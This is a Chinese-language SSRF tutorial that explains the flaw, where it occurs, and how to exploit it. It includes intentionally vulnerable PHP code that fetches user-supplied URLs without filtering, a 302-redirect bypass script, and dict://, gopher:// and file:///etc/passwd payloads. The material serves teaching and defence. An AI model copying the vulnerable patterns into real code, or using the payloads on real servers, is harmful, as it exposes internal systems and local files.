# SSRF

## SSRF 简介

SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。

漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。

攻击者可以利用 SSRF 实现的攻击主要有 5 种：

1. 可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息；
2. 攻击运行在内网或本地的应用程序（比如溢出）；
3. 对内网 web 应用进行指纹识别，通过访问默认文件实现；
4. 攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli 等）；
5. 利用 `file` 协议读取本地文件等。

## SSRF 漏洞出现的场景

- 能够对外发起网络请求的地方，就可能存在 SSRF 漏洞。
- 从远程服务器请求资源（Upload from URL，Import & Export RSS Feed）。
- 数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）。
- Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）。
- 文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）。

## 常用的后端实现

1. `file_get_contents`

   ```php
   <?php
   if (isset($_POST['url'])) 
   { 
   $content = file_get_contents($_POST['url']); 
   $filename ='./images/'.rand().';img1.jpg'; 
   file_put_contents($filename, $content); 
   echo $_POST['url']; 
   $img = "<img src=\"".$filename."\"/>"; 
   } 
   echo $img; 
   ?>
   ```

   这段代码使用 `file_get_contents` 函数从用户指定的 URL 获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。

2. `fsockopen()`

   ```php
   <?php 
   function GetFile($host,$port,$link) 
   { 
   $fp = fsockopen($host, intval($port), $errno, $errstr, 30); 
   if (!$fp) { 
   echo "$errstr (error number $errno) \n"; 
   } else { 
   $out = "GET $link HTTP/1.1\r\n"; 
   $out .= "Host: $host\r\n"; 
   $out .= "Connection: Close\r\n\r\n"; 
   $out .= "\r\n"; 
   fwrite($fp, $out); 
   $contents=''; 
   while (!feof($fp)) { 
   $contents.= fgets($fp, 1024); 
   } 
   fclose($fp); 
   return $contents; 
   } 
   }
   ?>
   ```

   这段代码使用 `fsockopen` 函数实现获取用户制定 URL 的数据（文件或者 HTML）。这个函数会使用 socket 跟服务器建立 TCP 连接，传输原始数据。

3. `curl_exec()`

   ```php
   <?php 
   if (isset($_POST['url']))
   {
   $link = $_POST['url'];
   $curlobj = curl_init();
   curl_setopt($curlobj, CURLOPT_POST, 0);
   curl_setopt($curlobj,CURLOPT_URL,$link);
   curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);
   $result=curl_exec($curlobj);
   curl_close($curlobj);

   $filename = './curled/'.rand().'.txt';
   file_put_contents($filename, $result); 
   echo $result;
   }
   ?>
   ```

   使用 `curl` 获取数据。

## 阻碍 SSRF 漏洞利用的场景

- 服务器开启 OpenSSL 无法进行交互利用
- 服务端需要鉴权（Cookies & User：Pass）不能完美利用

## 利用 SSRF 进行端口扫描

根据服务器的返回信息进行判断，大部分应用不会判别端口，可通过返回的 banner 信息判断端口状态。

后端实现

```php
<?php 
if (isset($_POST['url']))
{
$link = $_POST['url'];
$filename = './curled/'.rand().'txt';
$curlobj = curl_init($link);
$fp = fopen($filename,"w");
curl_setopt($curlobj, CURLOPT_FILE, $fp);
curl_setopt($curlobj, CURLOPT_HEADER, 0);
curl_exec($curlobj);
curl_close($curlobj);
fclose($fp);
$fp = fopen($filename,"r");
$result = fread($fp, filesize($filename)); 
fclose($fp);
echo $result;
}
?>
```

构造一个前端页面

```html
<html>
<body>
<form name="px" method="post" action="http://127.0.0.1/ss.php">
<input type="text" name="url" value="">
<input type="submit" name="commit" value="submit">
</form>
<script></script>
</body>
</html>
```

请求非 HTTP 的端口可以返回 banner 信息。

或可利用 302 跳转绕过 HTTP 协议的限制。

辅助脚本

```php
<?php
$ip = $_GET['ip'];
$port = $_GET['port'];
$scheme = $_GET['s'];
$data = $_GET['data'];
header("Location: $scheme://$ip:$port/$data");
?>
```

> [腾讯某处 SSRF 漏洞（非常好的利用点）附利用脚本](https://_thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de_.html)

## 协议利用

- Dict 协议

  ```
  dict://fuzz.wuyun.org:8080/helo:dict
  ```

- Gopher 协议

  ```
  gopher://fuzz.wuyun.org:8080/gopher
  ```

- File 协议

  ```
  file:///etc/passwd
  ```

## 参考资料

- [《Build Your SSRF EXP Autowork》猪猪侠](http://tools.40huo.cn/#!papers.md)
- [腾讯某处 SSRF 漏洞（非常好的利用点）附利用脚本](https://_thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de_.html)
- [bilibili 某分站从信息泄露到 ssrf 再到命令执行](https://_thorns.gitbooks.io/sec/content/bilibilimou_fen_zhan_cong_xin_xi_xie_lu_dao_ssrf_z.html)